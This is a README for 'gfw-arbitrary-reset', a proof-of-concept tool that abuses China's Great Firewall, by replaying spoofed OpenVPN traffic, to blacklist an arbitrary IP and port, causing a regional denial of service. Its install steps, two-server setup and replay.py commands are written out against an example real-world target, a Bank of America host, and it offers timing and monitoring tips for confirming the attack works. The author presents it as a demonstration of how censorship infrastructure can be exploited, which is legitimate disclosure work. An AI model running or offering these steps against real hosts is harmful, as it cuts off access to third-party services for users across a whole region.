gfw-arbitrary-reset
===================

A Proof of Concept for arbitrarily blacklisting a pair of IP:Port by replaying OpenVPN traffic across GFW. With two servers, machine A located in mainland China, and machine B outside China with permission for IP spoofing, one can perform a regional (China) Denial of Service without sending single packet to target host. 

Last tested effective on Dec. 31, 2012. 

### Installing Dependencies

	# Python 2.6 or 2.7 should be fine. 
	
	pip install tornado jsonrpclib
	pip install http://gs.ccp.li/scapy-7621f33286b9.zip
	pip install git+git://github.com/joshmarshall/tornadorpc.git
	
	# In case of Github failure: 
	#  pip install http://gs.ccp.li/tornadorpc-fda3e0e.zip
	# In case of PyPI failure:
	#  pip -i http://pypi.tuna.tsinghua.edu.cn/simple/ [package]

### How

Supposingly, we have the following two servers with ROOT privilege, and our target is safe.bankofamerica.com (171.159.228.172:443). 

`Machine A (123.58.180.8) => Server in China`  
`Machine B (173.223.104.110)  => Server in US. Must be able to spoof IP address.`

	# ssh root@machine-A  # 123.58.180.8
	python rpcserver.py 15001
	
	# ssh root@machine-B  # 173.223.104.110
	python rpcserver.py 15001
	
	# local desktop
	# Usage:  replay.py <machine A IP> <machine A port> <machine B IP> <machine B port> <target IP> <target port>
	
	python replay.py 123.58.180.8 15001 173.223.104.110 15001 171.159.228.172 443


There're 680 packets in `openvpn-tcp.dump`. It takes roughly ten minutes at the speed of 1 pkt/s. Running replay.py once should be sufficient, but more certainly doens't hurt.

Allow 24 hours maximum for blacklisting to become effective. Then any TCP connection from China to our target host (171.159.228.172:443) should be automatically reset by GFW. 

### Disclaimer
The purpose of this project is to show how a massive censorship firewall can be exploited to disrupt Internet. This is essentially a hacker tool; please be a responsible person while using it at your own risk. 

### Notes
To monitor traffic with Wireshark on machine A, use filter:

	ip.addr == ${TARGET_IP} and tcp.dstport != 15001 and tcp.srcport != 15001
Should see bidirectional traffic if scripts are working. 
